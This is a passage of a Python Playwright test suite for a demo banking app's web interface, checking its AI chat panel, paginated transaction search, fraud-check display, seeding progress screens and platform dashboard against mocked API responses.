        expect(rows.filter(has_text="Aggregation SQL")).to_be_visible()

        push, close = _hold_the_stream(page)
        page.locator(".b-comp textarea").fill("and the month before?")
        page.keyboard.press("Enter")
        page.get_by_role("button", name="New conversation").click()
        expect(aside.get_by_text("Ask something and each step shows up here")).to_be_visible()
        expect(rows).to_have_count(0)
        push("answer", {"answer": "You spent $38.00 on dining.", "citations": [], "proposals": [], "cached": False,
                        "route": "aggregate", "meta": {"trace": [{"label": "Late SQL", "detail": "", "ms": 9.0,
                                                                  "status": "success", "kind": "sql"}]}})
        push("done", {})
        close()
        page.wait_for_timeout(300)
        expect(aside).not_to_contain_text("Late SQL")
        expect(rows).to_have_count(0)
        assert not errors, errors
    finally:
        ctx.close()


def _paged_answer(text, route, search):
    return _sse(("token", {"text": text}),
                ("answer", {"answer": text, "citations": [], "proposals": [], "cached": False, "route": route,
                            "meta": {"trace": [], "search": search}}),
                ("done", {}))


def _page_item(n: int) -> dict:
    """One purchase of a typed "show more" page, as the answer meta carries it."""
    return {"expense_id": f"99999999-9999-4999-8999-{n:012d}", "merchant": f"Roaster {n}", "amount": 6.25,
            "date": "2026-10-01"}


def test_show_more_under_an_answer_lists_the_next_matches(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=_paged_answer("Here are your coffee stops.", "plan", {
            "q": "coffee", "category": None, "from": "2026-09-01", "to": None, "next": "bzEw"}))
        asked = []

        def search(route):
            asked.append(urllib.parse.parse_qs(urllib.parse.urlparse(route.request.url).query))
            route.fulfill(json={"items": [_match(1), _match(2)], "next_cursor": None})

        page.route("**/api/v1/transactions?q=*", search)
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", "where do I get coffee?")
        bot = page.locator(".b-panel .b-msg-bot")
        more = bot.get_by_role("button", name="Show 10 more")
        more.click()
        chips = bot.locator(".b-more .b-cite")
        expect(chips).to_have_count(2)
        expect(chips.nth(0)).to_contain_text("Cafe 1")
        expect(chips.nth(0)).to_contain_text("$5.50")
        expect(more).to_be_hidden()
        sent = asked[-1]
        assert sent["q"] == ["coffee"] and sent["cursor"] == ["bzEw"] and sent["limit"] == ["10"], sent
        assert sent["from"] == ["2026-09-01"] and "category" not in sent and "to" not in sent, sent
        assert not errors, errors
    finally:
        ctx.close()


def test_a_typed_show_more_lists_its_page_and_offers_the_next(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=_paged_answer("Here are 2 more matches for “coffee”.", "more", {
            "q": "coffee", "category": None, "from": None, "to": None, "next": "bzEy",
            "items": [_page_item(7), _page_item(8)]}))
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", "show more")
        bot = page.locator(".b-panel .b-msg-bot")
        expect(bot.locator(".b-more .b-cite")).to_have_count(2)
        expect(bot.locator(".b-more .b-cite").nth(1)).to_contain_text("Roaster 8")
        expect(bot.get_by_role("button", name="Show 10 more")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_a_reloaded_page_of_matches_is_still_there(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        user, _ = HISTORY["messages"]
        kept = {**HISTORY, "messages": [user, {"role": "assistant", "content": "Here are 1 more matches for “coffee”.",
                                               "meta": {"search": {"q": "coffee", "category": None, "from": None,
                                                                   "to": None, "next": None,
                                                                   "items": [_page_item(3)]}}}]}
        api = _PanelApi(page, history=kept)
        _remember_a_thread(page, server, "sam")
        _open_panel(page)
        api.release()
        bot = page.locator(".b-panel .b-msg-bot")
        expect(bot.locator(".b-more .b-cite")).to_have_count(1)
        expect(bot.locator(".b-more .b-cite")).to_contain_text("Roaster 3")
        expect(bot.get_by_role("button", name="Show 10 more")).to_have_count(0)
        assert not errors, errors
    finally:
        ctx.close()


def test_the_meta_line_says_what_was_spent_or_saved(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page, answer=PLANNED)
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        bots = page.locator(".b-panel .b-msg-bot")
        expect(bots.nth(0).locator(".b-meta")).to_contain_text("3 model calls · 2,950 tokens")
        api.answer = CACHED
        page.locator(".b-panel textarea").fill(TITLED)
        page.keyboard.press("Enter")
        expect(bots.nth(1).locator(".b-meta")).to_contain_text("cached · about 350 tokens saved")
        expect(bots.nth(1).locator(".b-meta")).not_to_contain_text("model call")
        expect(bots.nth(1).locator(".b-step")).to_have_count(0)
        assert not errors, errors
    finally:
        ctx.close()


def test_a_reloaded_answer_keeps_its_trace_and_plan(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        user, bot_said = HISTORY["messages"]
        kept = {**HISTORY, "messages": [user, {**bot_said, "meta": {"trace": PLAN_TRACE, "explain": PLAN,
                                                                    "tokens": SPENT, "model_calls": 1,
                                                                    "answer_ms": 4200, "region": "us-east-1",
                                                                    "db_ms": 23}}]}
        api = _PanelApi(page, history=kept)
        _remember_a_thread(page, server, "sam")
        _open_panel(page)
        api.release()
        bot = page.locator(".b-panel .b-msg-bot")
        expect(bot).to_contain_text("You spent $12.40 on coffee.")
        expect(bot.locator(".b-explain pre")).to_contain_text("table: expenses@idx_expenses_user_date")
        expect(bot.locator(".b-meta")).to_contain_text("4.2 s · 1 model call · 2,950 tokens")
        bot.get_by_role("button", name="How this was answered").click()
        rows = bot.locator(".b-trace .b-tl > div")
        expect(rows.filter(has_text="Aggregation SQL")).to_have_text("Aggregation SQL$42.10 across 3 transactions · 24 ms")
        expect(rows.filter(has_text="Time to answer")).to_have_text("Time to answer18200 ms")
        assert not errors, errors
    finally:
        ctx.close()


def test_an_answer_without_a_trace_offers_no_trace_button(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        _open_panel(page)
        api.release()
        bot = page.locator(".b-panel .b-msg-bot")
        expect(bot).to_contain_text("You spent $12.40 on coffee.")
        expect(bot.get_by_role("button", name="How this was answered")).to_have_count(0)
        expect(bot.locator(".b-explain")).to_be_hidden()
        expect(bot.get_by_role("button", name="copy")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_text_pasted_into_a_field_stays_text_even_with_an_image_along(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.route("**/api/v1/receipts", lambda r: r.fulfill(status=200, content_type="text/event-stream",
                                                             body=_sse(("error", {"message": "Not a receipt"}), ("done", {}))))
        _login(page, server, "maya")
        seen = page.evaluate("""() => {
            const got = [];
            window.addEventListener('banko:receipt', (e) => got.push(e.detail.file.name));
            const paste = (target, text) => {
                const dt = new DataTransfer();
                if (text) dt.setData('text/plain', text);
                dt.items.add(new File(['png'], 'slide.png', { type: 'image/png' }));
                return target.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
            };
            // Copied from Keynote: the text and a picture of it.
            const fieldKeptDefault = paste(document.querySelector('.b-palette input'), 'Q3 revenue');
            const inField = got.length;
            paste(document.body, '');
            return { fieldKeptDefault, inField, anywhere: got.length - inField };
        }""")
        assert seen == {"fieldKeptDefault": True, "inField": 0, "anywhere": 1}
    finally:
        ctx.close()


def test_forms_send_what_their_selects_show(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        sent = {}

        def capture(name, reply):
            def handler(route):
                if route.request.method in ("PUT", "POST"):
                    sent[name] = route.request.post_data_json
                    return route.fulfill(**reply)
                return route.fallback()
            return handler

        page.route("**/api/v1/budgets", capture("budget", {"json": {}}))
        page.route("**/api/v1/transfers", capture("transfer", {"status": 201, "json": {"status": "ok", "transfer_id": NEW_THREAD}}))
        _login(page, server, "riley")

        # Add a budget without touching the category select.
        page.goto(server + "/budget")
        page.wait_for_load_state("networkidle")
        page.get_by_role("button", name="Add a budget").click()
        form = page.locator("section form.b-card")
        shown = form.locator("select").input_value()
        form.locator("input").fill("120")
        form.get_by_role("button", name="Add", exact=True).click()
        expect(form).to_be_hidden()
        assert shown and sent["budget"]["category"] == shown

        # Move money: pick, as From, the account that To was showing.
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        page.get_by_role("button", name="Move money").click()
        dialog = page.locator("form.b-dialog")
        expect(dialog).to_be_visible()
        source, target = dialog.locator("select").nth(0), dialog.locator("select").nth(1)
        was_to = target.input_value()
        source.select_option(was_to)
        now_to = target.input_value()
        dialog.locator("input").fill("1.00")
        dialog.get_by_role("button", name="Move", exact=True).click()
        expect(dialog).to_be_hidden()
        assert sent["transfer"]["from_account"] == was_to
        assert sent["transfer"]["to_account"] == now_to != was_to
        assert not errors, errors
    finally:
        ctx.close()


def test_the_agents_feed_orders_live_and_stored_items_by_time(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        stored = [{"id": "receipt:1", "agent": "receipt", "kind": "posted", "title": "Stored at ten", "detail": "Posted",
                   "confidence": None, "region": None, "at": "2026-10-13T10:00:00.123456+00:00"}]
        page.route("**/api/v1/agents/activity", lambda r: r.fulfill(json={"items": stored}))
        page.route("**/api/v1/agents/stats", lambda r: r.fulfill(json={"agents": [], "today": {}}))
        _login(page, server, "maya")
        page.goto(server + "/agents")
        page.wait_for_load_state("networkidle")
        page.evaluate("""() => {
            const live = (message, timestamp) => Banko.emit('banko:agent', { source: 'activity', agent_type: 'fraud',
                status: 'completed', message, user_id: Banko.shell.user.user_id, timestamp });
            live('Live at half past ten', '2026-10-13T06:30:00-04:00');
            live('Live at nine', '2026-10-13T09:00:00+00:00');
        }""")
        rows = page.locator("section .b-s3 .b-bill")
        expect(rows).to_have_count(3)
        order = [next(t for t in ("half past ten", "Stored at ten", "Live at nine") if t in text)
                 for text in rows.all_inner_texts()]
        assert order == ["half past ten", "Stored at ten", "Live at nine"]
        assert not errors, errors
    finally:
        ctx.close()


PURCHASE_ID = "88888888-8888-4888-8888-888888888888"


def _purchase(**extra):
    """A transaction detail as GET /api/v1/transactions/<id> returns it."""
    base = {"id": PURCHASE_ID, "expense_id": PURCHASE_ID, "kind": "purchase", "posted_at": "2026-10-12",
            "amount": -9.75, "merchant": "Blue Bottle", "description": "Coffee", "category": "Coffee",
            "category_label": "Coffee", "category_icon": "☕", "payment_method": "Debit Card", "account_id": None,
            "similar": [], "residency": None, "receipt": None,
            "checks": {"duplicates": [], "decisions": [{"decision_id": "d1", "decision_type": "fraud_analysis",
                                                        "confidence": 0.0, "reasoning": "No indicators",
                                                        "action": {"fraud_detected": False},
                                                        "created_at": "2026-10-12T10:00:00+00:00"}]}}
    return {**base, **extra}


def test_a_fraud_check_shows_its_fraud_score_not_a_confidence(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.route(f"**/api/v1/transactions/{PURCHASE_ID}", lambda r: r.fulfill(json=_purchase()))
        page.route("**/api/v1/agents/activity", lambda r: r.fulfill(json={"items": [
            {"id": "decision:f", "agent": "fraud", "kind": "fraud_analysis", "title": "Fraud analysis",
             "detail": "No indicators", "confidence": 0.0, "region": None, "at": "2026-10-13T10:00:00+00:00"},
            {"id": "decision:b", "agent": "budget", "kind": "budget_check", "title": "Budget check",
             "detail": "On track", "confidence": 0.85, "region": None, "at": "2026-10-13T09:00:00+00:00"}]}))
        _login(page, server, "maya")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", PURCHASE_ID)
        drawer = page.locator("aside.b-drawer")
        expect(drawer).to_contain_text("✓ Fraud check passed · fraud score 0%")
        expect(drawer).not_to_contain_text("confidence")

        page.goto(server + "/agents")
        page.wait_for_load_state("networkidle")
        rows = page.locator("section .b-s3 .b-bill")
        expect(rows.filter(has_text="Fraud analysis")).to_contain_text("fraud score 0%")
        expect(rows.filter(has_text="Budget check")).to_contain_text("confidence 85%")
        assert not errors, errors
    finally:
        ctx.close()


def test_the_transactions_range_sends_the_dates_the_api_reads(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        asked = []

        def listing(route):
            asked.append(urllib.parse.parse_qs(urllib.parse.urlparse(route.request.url).query))
            route.fulfill(json={"items": [], "next_cursor": None})

        page.route("**/api/v1/transactions?*", listing)
        _login(page, server, "sam")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        assert asked and "date_from" not in asked[0], asked
        start = datetime.date.fromisoformat(asked[0]["from"][0])
        assert 29 <= (datetime.date.today() - start).days <= 31
        page.get_by_role("button", name="All time").click()
        page.wait_for_load_state("networkidle")
        assert "from" not in asked[-1], asked[-1]
        assert not errors, errors
    finally:
        ctx.close()


def _match(n: int) -> dict:
    """A semantic search hit as GET /api/v1/transactions?q= returns it."""
    ident = f"88888888-8888-4888-8888-{n:012d}"
    return {"id": ident, "expense_id": ident, "kind": "purchase", "posted_at": "2026-10-12", "amount": -4.5 - n,
            "merchant": f"Cafe {n}", "description": "Coffee", "category": "Coffee", "category_label": "Coffee",
            "category_icon": "☕", "distance": 0.2 + n / 100, "account_id": None}


def test_a_transactions_search_loads_more_from_its_cursor(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        asked = []

        def listing(route):
            query = urllib.parse.parse_qs(urllib.parse.urlparse(route.request.url).query)
            asked.append(query)
            if "q" not in query:
                return route.fulfill(json={"items": [], "next_cursor": None})
            if query.get("cursor") == ["next-page"]:
                return route.fulfill(json={"items": [_match(3), _match(4)], "next_cursor": None})
            return route.fulfill(json={"items": [_match(0), _match(1), _match(2)], "next_cursor": "next-page"})

        page.route("**/api/v1/transactions?*", listing)
        _login(page, server, "sam")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        page.locator(".b-search input").fill("coffee")
        page.keyboard.press("Enter")
        rows = page.locator(".b-tx")
        expect(rows).to_have_count(3)
        more = page.get_by_role("button", name="Load more")
        more.click()
        expect(rows).to_have_count(5)
        expect(rows.nth(4)).to_contain_text("Cafe 4")
        expect(more).to_be_hidden()
        assert asked[-1]["q"] == ["coffee"] and asked[-1]["cursor"] == ["next-page"], asked[-1]
        assert not errors, errors
    finally:
        ctx.close()


def test_the_drawer_shows_purchase_checks_only_on_purchases(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        income_id = "99999999-9999-4999-8999-999999999999"
        residency = {"stored_in": "us-east-1", "home_region": "us-east-1"}
        page.route(f"**/api/v1/transactions/{PURCHASE_ID}", lambda r: r.fulfill(json=_purchase(residency=residency)))
        page.route(f"**/api/v1/transactions/{income_id}", lambda r: r.fulfill(json={
            "id": income_id, "kind": "income", "posted_at": "2026-10-10", "amount": 2500.0, "description": "Payroll deposit",
            "merchant": None, "category": None, "account_id": None, "similar": [], "residency": residency,
            "receipt": None, "checks": {"duplicates": [], "decisions": []}}))
        _login(page, server, "maya")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        drawer = page.locator("aside.b-drawer")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", income_id)
        expect(drawer).to_contain_text("Payroll deposit")
        expect(drawer.get_by_text("Agent checks")).to_be_hidden()
        expect(drawer.get_by_text("Not a duplicate")).to_be_hidden()
        expect(drawer).to_contain_text("loaded in")
        page.evaluate("(id) => Banko.emit('banko:open-transaction', { id })", PURCHASE_ID)
        expect(drawer.get_by_text("Agent checks")).to_be_visible()
        expect(drawer.get_by_text("✓ Not a duplicate")).to_be_visible()
        expect(drawer).not_to_contain_text("read in")
        assert not errors, errors
    finally:
        ctx.close()


def test_goal_pace_tags_follow_the_goal(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        def goal(name, *, remaining, target_date, on_track):
            return {"goal_id": name, "name": name, "icon": "🎯", "target_amount": 1000, "target_date": target_date,
                    "account_id": NEW_THREAD, "saved": 1000 - remaining, "remaining": remaining,
                    "progress": (1000 - remaining) / 1000, "monthly_pace": 100,
                    "projected_completion": "2027-01-01" if remaining else "2026-10-13", "on_track": on_track}
        page.route("**/api/v1/goals", lambda r: r.fulfill(json={"items": [
            goal("Someday", remaining=600, target_date=None, on_track=False),
            goal("Finished late", remaining=0, target_date="2026-06-01", on_track=False),
            goal("Steady", remaining=500, target_date="2027-06-01", on_track=True),
            goal("Slipping", remaining=900, target_date="2026-11-01", on_track=False)]}))
        _login(page, server, "maya")
        page.goto(server + "/goals")
        page.wait_for_load_state("networkidle")
        cards = page.locator("section .b-grid > .b-card")
        tags = {name: cards.filter(has_text=name).locator(".b-tag") for name in ("Someday", "Finished late", "Steady", "Slipping")}
        expect(tags["Someday"]).to_have_count(0)
        expect(tags["Finished late"]).to_have_text("Done")
        expect(cards.filter(has_text="Finished late")).not_to_contain_text("Behind")
        expect(tags["Steady"]).to_have_text("On track")
        expect(tags["Slipping"]).to_have_text("Behind")
        assert not errors, errors
    finally:
        ctx.close()


NO_ACCOUNTS = {"accounts": [], "groups": {"cash": [], "credit": []}, "cash_total": 0, "credit_total": 0,
               "net_worth": 0, "utilization": 0}


def _no_money_yet(page, seeding):
    """A user whose history is not written yet: /me reports `seeding`, and
    the money endpoints answer the way they do before the first row lands."""
    def me(route):
        real = route.fetch().json()
        route.fulfill(json={**real, "seeding": seeding})
    page.route("**/api/v1/me", me)
    page.route("**/api/v1/accounts", lambda r: r.fulfill(json=NO_ACCOUNTS))
    page.route("**/api/v1/accounts/history*", lambda r: r.fulfill(json={"items": [
        {"month": m, "net_worth": 0} for m in ("2026-08", "2026-09", "2026-10")]}))
    page.route("**/api/v1/cashflow*", lambda r: r.fulfill(json={"months": [
        {"month": m, "income": 0, "spending": 0, "net": 0, "savings_rate": None} for m in ("2026-08", "2026-09", "2026-10")],
        "categories": [], "merchants": []}))


def test_pages_wait_for_seeding_and_offer_a_refresh_when_it_finishes(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        _no_money_yet(page, {"state": "running", "done": 1200, "total": 5000})
        for path in ("/accounts", "/cashflow"):
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            expect(page.get_by_text("Setting up your accounts")).to_be_visible()
            expect(page.get_by_text("Writing your history: 1200 of 5000 ledger entries")).to_be_visible()
            expect(page.locator(".b-bar.busy")).to_be_visible()  # a batch is in flight: the bar moves
            expect(page.locator("section .b-grid")).to_be_hidden()  # no $0.00 dressed up as a figure
            expect(page.get_by_text("No accounts yet")).to_have_count(0 if path == "/cashflow" else 1)
            expect(page.get_by_text("No accounts yet")).to_be_hidden()
        page.unroute("**/api/v1/me")
        page.unroute("**/api/v1/cashflow*")
        # Work in progress on the page, which a reload would throw away.
        page.evaluate("() => Banko.emit('banko:ask', {})")
        panel = page.locator(".b-panel")
        panel.locator("textarea").fill("a question I was still typing")
        page.evaluate("() => { window.__stayed = true; }")
        page.evaluate("() => Banko.emit('banko:seeding', { user_id: Banko.shell.user.user_id, state: 'done', done: 5000, total: 5000 })")
        expect(page.get_by_text("Your accounts are ready")).to_be_visible()
        expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        page.wait_for_timeout(500)
        assert page.evaluate("() => window.__stayed") is True
        expect(panel.locator("textarea")).to_have_value("a question I was still typing")
        page.keyboard.press("Escape")
        with page.expect_navigation():
            page.get_by_role("button", name="Refresh").click()
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Your accounts are ready")).to_be_hidden()
        expect(page.locator("section .b-grid")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_no_data_and_failed_seeding_show_real_next_steps(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        _no_money_yet(page, None)
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("No accounts yet")).to_be_visible()
        expect(page.locator("section").get_by_role("button", name="Add a receipt")).to_be_visible()
        page.goto(server + "/cashflow")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Nothing to chart yet")).to_be_visible()
        expect(page.locator("section .b-grid")).to_be_hidden()

        page.unroute("**/api/v1/me")
        _no_money_yet(page, {"state": "failed", "done": 800, "total": 5000})
        for path in ("/accounts", "/"):
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            expect(page.get_by_text("Your demo data didn't finish loading")).to_be_visible()
            expect(page.get_by_role("link", name="Open Settings")).to_be_visible()
            expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        # A seed that fails while the dashboard watches stops the bar too.
        page.unroute("**/api/v1/me")
        _no_money_yet(page, {"state": "running", "done": 10, "total": 5000})
        page.goto(server + "/")
        page.wait_for_load_state("networkidle")
        expect(page.get_by_text("Setting up your accounts")).to_be_visible()
        page.evaluate("() => Banko.emit('banko:seeding', { user_id: Banko.shell.user.user_id, state: 'failed', done: 20, total: 5000 })")
        expect(page.get_by_text("Your demo data didn't finish loading")).to_be_visible()
        expect(page.get_by_text("Setting up your accounts")).to_be_hidden()
        assert not errors, errors
    finally:
        ctx.close()


def test_midnight_takes_its_accent_shades_from_the_brand_accent(server, browser):
    ctx, page, errors = _page(browser, "dark")
    try:
        _login(page, server, "maya")
        page.goto(server + "/accounts")
        page.wait_for_load_state("networkidle")
        assert page.evaluate("() => document.documentElement.dataset.theme") == "dark"

        def shades():
            return page.evaluate("""() => {
                const card = document.createElement('div');
                card.className = 'b-card b-ins';
                document.body.appendChild(card);
                const out = { chart: Banko.charts.css('--chart-1'), insight: getComputedStyle(card).backgroundImage };
                card.remove();
                return out;
            }""")

        brand = shades()
        page.evaluate("() => document.documentElement.style.setProperty('--ac', '#E5484D')")  # BRAND_ACCENT, red
        red = shades()
        assert brand["chart"].startswith("#") and red["chart"].startswith("#")
        assert red["chart"] != brand["chart"] and red["insight"] != brand["insight"]
        r, g, b = (int(red["chart"][i:i + 2], 16) for i in (1, 3, 5))
        assert r > g and r > b, red["chart"]
        assert not errors, errors
    finally:
        ctx.close()


def test_transactions_survive_a_failed_category_fetch(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        purchase = page.evaluate("async () => (await Banko.api('/api/v1/transactions?kind=purchase&limit=1')).items[0]")
        calls = []

        def flaky(route):
            calls.append(route.request.url)
            if len(calls) == 1:
                return route.fulfill(status=500, json={"error": "Something went wrong on our side."})
            return route.fallback()

        page.route("**/api/v1/categories", flaky)
        page.goto(server + "/transactions?open=" + purchase["expense_id"])
        drawer = page.locator("aside.b-drawer")
        expect(drawer).to_contain_text(purchase["merchant"])
        expect(drawer.locator("select option")).not_to_have_count(0)  # fetched again after the failure
        page.keyboard.press("Escape")
        expect(drawer).to_be_hidden()
        page.locator(".b-filters button.b-f").first.click()
        expect(page.locator(".b-filters select").nth(1).locator("option")).not_to_have_count(1)
        assert len(calls) >= 2
        assert errors == ["Failed to load resource: the server responded with a status of 500 (Internal Server Error)"], errors
    finally:
        ctx.close()


def test_resetting_a_persona_asks_first(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        sent, asked = [], []

        def reset(route):
            sent.append(route.request.post_data_json)
            route.fulfill(status=202, json={"status": "started", "users": 1})

        def answer(accept):
            def handler(dialog):
                asked.append(dialog.message)
                dialog.accept() if accept else dialog.dismiss()
            return handler

        page.route("**/api/v1/admin/reset", reset)
        _login(page, server, "sam")
        page.goto(server + "/settings")
        page.wait_for_load_state("networkidle")
        button = page.get_by_role("button", name="Reset Maya")
        page.once("dialog", answer(False))
        button.click()
        page.wait_for_timeout(300)
        assert len(asked) == 1 and asked[0].startswith("Reset Maya Chen?") and sent == []
        page.once("dialog", answer(True))
        button.click()
        expect(page.get_by_text("Resetting Maya Chen.")).to_be_visible()
        assert sent == [{"persona": "maya"}]
        assert not errors, errors
    finally:
        ctx.close()


@pytest.mark.parametrize(("platform", "label"), [("MacIntel", "⌘K"), ("Win32", "Ctrl K"), ("Linux x86_64", "Ctrl K")])
def test_the_palette_shortcut_reads_right_on_each_platform(server, browser, platform, label):
    ctx, page, errors = _page(browser, "light")
    try:
        page.add_init_script(f"""
            Object.defineProperty(Navigator.prototype, 'platform', {{ get: () => '{platform}' }});
            Object.defineProperty(Navigator.prototype, 'userAgentData', {{ get: () => undefined }});""")
        _login(page, server, "maya")
        expect(page.locator(".b-ask kbd")).to_have_text(label)
        assert not errors, errors
    finally:
        ctx.close()


def test_a_fresh_signup_shows_progress_not_zeros(server, browser):
    """While a new user's history is written, the dashboard shows the setup
    card and its count instead of a grid of zeros, and draws the figures
    once seeding reports done. The test database writes a new history
    faster than a check can look, so /api/v1/me is held at "running" and
    the live socket is left out until the test sends done itself."""
    ctx, page, errors = _page(browser, "light")
    try:
        page.add_init_script("Object.defineProperty(window, 'io', { get: () => undefined, set: () => {} });")

        def running(route):
            me = route.fetch().json()
            route.fulfill(json={**me, "seeding": {"user_id": me.get("user_id"), "state": "running",
                                                  "done": 50, "total": 232}})

        page.route("**/api/v1/me", running)
        page.goto(server + "/login")
        page.fill('#name-form input[name="username"]', f"ui-{int(time.time())}")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_selector("#signup-section", state="visible")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_url(server + "/")
        dashboard = page.locator('section[x-data="dashboardPage"]')
        card = dashboard.locator(".b-card", has_text="Setting up your accounts")
        expect(card).to_be_visible()
        expect(card).to_contain_text("Writing your history: 50 of 232 ledger entries")
        expect(dashboard.locator(":scope > .b-grid").first).to_be_hidden()

        page.unroute("**/api/v1/me")
        page.wait_for_function("async () => ((await Banko.api('/api/v1/me')).seeding || {}).state !== 'running'")
        page.evaluate("() => Banko.emit('banko:seeding', { user_id: Banko.shell.user.user_id, state: 'done' })")
        expect(card).to_be_hidden()
        expect(dashboard.locator(":scope > .b-grid").first).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


# -- The Platform page, with its API answered by page.route ---------------------------------------

_NOW = int(time.time())
_T = list(range(_NOW - 300, _NOW))
_QUIET = {"ops_s": 0, "errors_s": 0, "ok": 0, "errors": 0, "declined": 0, "dropped": 0, "retries": 0,
          "p50": None, "p95": None, "p99": None, "error_classes": {}}
_BUSY = {"ops_s": 48.2, "errors_s": 0.3, "ok": 482, "errors": 3, "declined": 2, "dropped": 0, "retries": 4,
         "p50": 61.5, "p95": 140.2, "p99": 310.7, "error_classes": {"40001": 3}}
_CONTROLS = {"load": True, "chaos": False, "defaults": {"users": 100, "rate": 50, "workers": 16},
             "limits": {"users": 2000, "rate": 2000, "workers": 64}}


def _live(state="idle", **over):
    running = state != "idle"
    body = {"load": {"state": state, "error": None, "started_at": _NOW - 60 if running else None,
                     "elapsed_s": 60.0 if running else 0.0, "users_ready": 100 if running else 0,
                     "config": {"users": 100, "rate": 50, "workers": 16, "profile": "balanced", "duration_s": None,
                                "ramp_s": 10, "weights": None} if running else None,
                     "serving": {"us-east-1": {"served_by": "us-east-1", "at": _NOW}} if running else {}},
            "summary": _BUSY if running else _QUIET,
            "ops": {"purchase": _BUSY, "search": _BUSY} if running else {},
            "regions": {"us-east-1": _BUSY, "us-west-2": _BUSY} if running else {},
            "series": {"t": _T, "ops": [48] * 300 if running else [0] * 300, "errors": [0] * 300,
                       "dropped": [0] * 300, "p50": [61.5] * 300 if running else [None] * 300,
                       "p95": [140.2] * 300 if running else [None] * 300, "p99": [310.7] * 300 if running else [None] * 300},
            "http": _QUIET, "db": {"retries_s": 0.1, "failures_s": 0},
            "events": [{"id": 1, "at": _NOW - 30, "level": "info", "source": "load",
                        "text": "Load started: balanced, 100 customers, 50 ops/s, 16 workers"}] if running else [],
            "controls": dict(_CONTROLS), "as_of": _NOW}
    body.update(over)
    return body


_CLUSTER_SQL = {"topology": {"source": "sql", "regions": [], "nodes": [
    {"node_id": 1, "address": None, "region": None, "zone": None, "live": None, "status": None, "replicas": 12,
     "leases": None}]}, "chaos": None, "leases": None, "as_of": _NOW, "stale": False}
_CLUSTER_CHAOS = {"topology": {"source": "chaos", "regions": ["us-east-1", "us-west-2"], "nodes": [
    {"node_id": 1, "name": "us-east-1a-n1", "address": None, "region": "us-east-1", "zone": "us-east-1a", "live": True,
     "status": "live", "replicas": 300, "leases": 80},
    {"node_id": 3, "name": "us-west-2a-n1", "address": None, "region": "us-west-2", "zone": "us-west-2a", "live": True,
     "status": "live", "replicas": 290, "leases": 50}]},
    "chaos": {"cluster": {"display_name": "Global Payments", "status": "healthy", "latency": "realistic",
                          "live_nodes": 2, "total_nodes": 2, "survival_goal": "region", "crdb_version": "v26.3.2"},
              "regions": [{"name": "us-east-1", "label": "N. Virginia", "primary": True, "state": "healthy",
                           "nodes_total": 1, "nodes_up": 1},
                          {"name": "us-west-2", "label": "Oregon", "primary": False, "state": "healthy",
                           "nodes_total": 1, "nodes_up": 1}],
              "nodes": [{"name": "us-east-1a-n1", "node_id": 1, "region": "us-east-1", "zone": "us-east-1a",
                         "runtime": "running", "liveness": "live", "partitioned": False, "isolated": False,
                         "brownout": None, "leases": 80, "replicas": 300},
                        {"name": "us-west-2a-n1", "node_id": 3, "region": "us-west-2", "zone": "us-west-2a",
                         "runtime": "running", "liveness": "live", "partitioned": False, "isolated": False,
                         "brownout": None, "leases": 50, "replicas": 290}],
              "scenario": None, "events": []},
    "leases": {"source": "nodes", "by_region": {"us-east-1": 80, "us-west-2": 50}}, "as_of": _NOW, "stale": False}
_DATA = {"users": [{"region": "us-east-1", "personas": 1, "load": 50, "demo": 0, "total": 51},
                   {"region": "us-west-2", "personas": 1, "load": 50, "demo": 0, "total": 51}],
         "residency": {"tables": [{"name": "accounts", "locality": "REGIONAL BY ROW", "rls": True},
                                  {"name": "expenses", "locality": "REGIONAL BY ROW", "rls": False},
                                  {"name": "users", "locality": "GLOBAL", "rls": False}],
                       "users_global": True, "rls": {"enabled": True, "reason": "banko_app can log in"}},
         "vectors": {"vectors": 5861, "users_with_vectors": 105,
                     "index": "idx_expenses_user_embedding: C-SPANN vector index on (user_id, embedding), cosine distance"},
